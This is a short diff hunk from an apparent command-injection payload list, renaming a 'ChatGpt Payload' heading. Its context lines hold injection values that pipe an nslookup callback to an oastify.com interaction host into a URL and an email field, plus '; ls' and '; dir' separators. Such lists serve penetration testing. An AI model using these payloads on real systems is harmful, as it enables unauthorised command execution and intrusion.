@@ -149,7 +149,7 @@ Example-02: https://api.seedr.ru/uploads/521b62f5b7132de722027388|nslookup -q=cn
 
 Example-03: email=a@a.com|nslookup -q=cname 6dkbk5sl74e1lw093edka1x3buhl5g34s.oastify.com.&.zip
 ```
-## ChatGpt Payload
+## ChatGpt Generated Payload
 ```
 ; ls
 ; dir
